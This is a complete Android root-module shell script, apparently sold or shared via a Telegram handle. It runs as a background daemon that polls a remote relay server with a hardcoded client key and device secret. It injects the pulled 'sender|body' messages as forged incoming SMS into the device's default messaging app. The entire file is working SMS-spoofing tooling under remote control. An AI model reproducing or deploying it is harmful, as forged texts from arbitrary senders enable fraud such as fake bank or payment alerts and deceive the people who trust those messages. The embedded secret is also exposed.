#!/system/bin/sh
# =====================================================================
#  PAPIATMA MODULE  -  On-device SMS Inject Daemon
#  Telegram: @papiatma   |   Credit: PAPIATMA MODULE (@papiatma)
# ---------------------------------------------------------------------
#  Backend se client ki queued messages pull karke SMS inject karta hai
#  (classes.dex ke com.floatingmenu.SmsBroadcaster se).
#  Message format: "sender|body"
#
#  ONE-TIME BACKGROUND RUN (bina reboot ke abhi chalane ke liye, root shell):
#    setsid sh /data/adb/modules/zygisk_floating_menu/papiatma_inject.sh >/dev/null 2>&1 &
#
#  BOOT PAR AUTO-START: service.sh use karo (isi module folder me rakho).
# =====================================================================

# ------------------------- CONFIG (edit these) -----------------------
MODDIR="/data/adb/modules/zygisk_floating_menu"
BACKEND="https://sender-msg-relay.preview.emergentagent.com"
CLIENT_KEY="ramu"                                 # admin panel wala client key
DEVICE_SECRET="50485cc07fd8787bc8c5d1e7c26d111a"  # backend .env ka DEVICE_SECRET

# SMS app package:
#   ""  (khaali)  = AUTO-DETECT default SMS app (recommended)
#   ya manually daalo, e.g. com.google.android.apps.messaging
#   "none"        = bina package ke broadcast (sab apps ko)
SMS_APP_PACKAGE=""

POLL_SECONDS=5
REFRESH_PKG_EVERY=60        # har itne loops ke baad default SMS app dubara detect
LOG="$MODDIR/papiatma_inject.log"
# ---------------------------------------------------------------------

log() { echo "$(date '+%Y-%m-%d %H:%M:%S') [PAPIATMA MODULE] $1" >> "$LOG"; }

# curl / wget
if command -v curl >/dev/null 2>&1; then
    GET() { curl -s "$1"; }
elif [ -x "$MODDIR/bin/curl" ]; then
    GET() { "$MODDIR/bin/curl" -s "$1"; }
elif command -v busybox >/dev/null 2>&1; then
    GET() { busybox wget -q -O - "$1"; }
else
    log "ERROR: curl/wget nahi mila"
    exit 1
fi

# Default SMS app ka package auto-detect karo
detect_pkg() {
    p=$(settings get secure sms_default_application 2>/dev/null)
    case "$p" in
        null|""|*Exception*|*not*found*) p="" ;;
    esac
    printf '%s' "$p"
}

resolve_pkg() {
    if [ -n "$SMS_APP_PACKAGE_MANUAL" ]; then
        CUR_PKG="$SMS_APP_PACKAGE_MANUAL"
    else
        d=$(detect_pkg)
        if [ -n "$d" ]; then
            CUR_PKG="$d"
        else
            CUR_PKG="com.google.android.apps.messaging"
        fi
    fi
}

inject_sms() {
    _sender="$1"
    _body="$2"
    CLASSPATH="$MODDIR/classes.dex" app_process /system/bin com.floatingmenu.SmsBroadcaster "$_sender" "$_body" "$CUR_PKG" >>"$LOG" 2>&1
    log "INJECTED sender=[$_sender] body=[$_body] pkg=[$CUR_PKG]"
}

# Agar user ne manual value di hai to use rakho, warna auto
if [ -n "$SMS_APP_PACKAGE" ] && [ "$SMS_APP_PACKAGE" != "none" ]; then
    SMS_APP_PACKAGE_MANUAL="$SMS_APP_PACKAGE"
elif [ "$SMS_APP_PACKAGE" = "none" ]; then
    SMS_APP_PACKAGE_MANUAL="none"
else
    SMS_APP_PACKAGE_MANUAL=""
fi

resolve_pkg
log "Daemon started (client=$CLIENT_KEY, poll=${POLL_SECONDS}s, pkg=$CUR_PKG)"

COUNT=0
while true; do
    # Beech-beech me default SMS app dubara detect karo (agar auto mode hai)
    if [ -z "$SMS_APP_PACKAGE_MANUAL" ]; then
        COUNT=$((COUNT + 1))
        if [ "$COUNT" -ge "$REFRESH_PKG_EVERY" ]; then
            resolve_pkg
            COUNT=0
        fi
    fi

    URL="$BACKEND/api/device/pull?key=$CLIENT_KEY&secret=$DEVICE_SECRET&max=20"
    RESP=$(GET "$URL" 2>/dev/null)

    if [ -n "$RESP" ]; then
        printf '%s\n' "$RESP" | while IFS= read -r line; do
            line=$(printf '%s' "$line" | tr -d '\r')
            [ -z "$line" ] && continue
            sender=$(printf '%s' "$line" | cut -d'|' -f1)
            body=$(printf '%s' "$line" | cut -d'|' -f2-)
            inject_sms "$sender" "$body"
        done
    fi

    sleep "$POLL_SECONDS"
done
